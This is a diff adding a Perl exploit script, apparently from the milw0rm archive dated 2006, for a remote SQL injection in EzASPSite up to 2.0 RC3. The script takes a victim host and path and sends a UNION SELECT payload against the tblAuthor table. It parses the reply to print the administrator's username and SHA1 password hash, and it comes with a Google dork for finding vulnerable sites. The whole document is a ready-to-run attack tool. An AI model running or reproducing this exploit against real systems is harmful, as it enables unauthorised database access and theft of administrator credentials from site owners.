@@ -1,0 +1,69 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=22
+#Usage: ezasp.pl <host> <path>
+#googledork: [ "Powered By EzASPSite v2.0 RC3" ] 62.400 Pages..
+use IO::Socket;
+if(@ARGV != 2) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print "\n- NukedX Security Advisory Nr.2006-22\r\n";
+  print "- EzASPSite <= 2.0 RC3 Remote SQL Injection Exploit\r\n";
+}
+sub usage() 
+{
+  header();
+  print "- Usage: $0 <host> <path>\r\n";
+  print "- <host> -> Victim's host ex: www.victim.com\r\n";
+  print "- <path> -> Path to EzASPSite ex: /ezasp/\r\n";
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $ezserver = $ARGV[0];
+  $ezserver =~ s/(http:\/\/)//eg;
+  $ezhost   = "http://".$ezserver;
+  $ezdir    = $ARGV[1];
+  $ezport   = "80";
+  $eztar    = "Default.asp?Scheme=";
+  $ezxp     = "-1+UNION+SELECT+0,0,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username,0,0,0,0,0,0,0,0,'NWPX',0,0,0,0,0,0,0+from+tblAuthor+where+Group_ID=1";
+  $ezreq    = $ezhost.$ezdir.$eztar.$ezxp;
+  #Sending data...
+  header();
+  print "- Trying to connect: $ezserver\r\n";
+  $ez = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$ezserver", PeerPort => "$ezport") || die "- Connection failed...\n";
+  print $ez "GET $ezreq HTTP/1.1\n";
+  print $ez "Accept: */*\n";
+  print $ez "Referer: $ezhost\n";
+  print $ez "Accept-Language: tr\n";
+  print $ez "User-Agent: NukeZilla\n";
+  print $ez "Cache-Control: no-cache\n";
+  print $ez "Host: $ezserver\n";
+  print $ez "Connection: close\n\n";
+  print "- Connected...\r\n";
+  while ($answer = <$ez>) {
+    if ($answer =~ /<link href=\"forum\/(.*?)\" rel=\"stylesheet\"/) {
+      print "- Exploit succeed! Getting admin's information\r\n";
+      print "- USERNAME: $1\r\n";
+    }
+    if ($answer =~ /bgcolor=\"NWPX\" background=\"forum\/(.*?)\">/) {
+      print "- SHA1 HASH of PASSWORD: $1\r\n";
+      exit();
+    }
+    if ($answer =~ /number of columns/) { 
+      print "- This version of EzASPSite is vulnerable too\r\n";
+      print "- but default query of SQL-Inj. does not work on it\r\n";
+      print "- So please edit query by manually adding null data..\r\n";
+      exit(); 
+    }
+  }
+  #Exploit failed...
+  print "- Exploit failed\n"
+}
+
+# nukedx.com [2006-03-29]
+
+# milw0rm.com [2006-03-29]
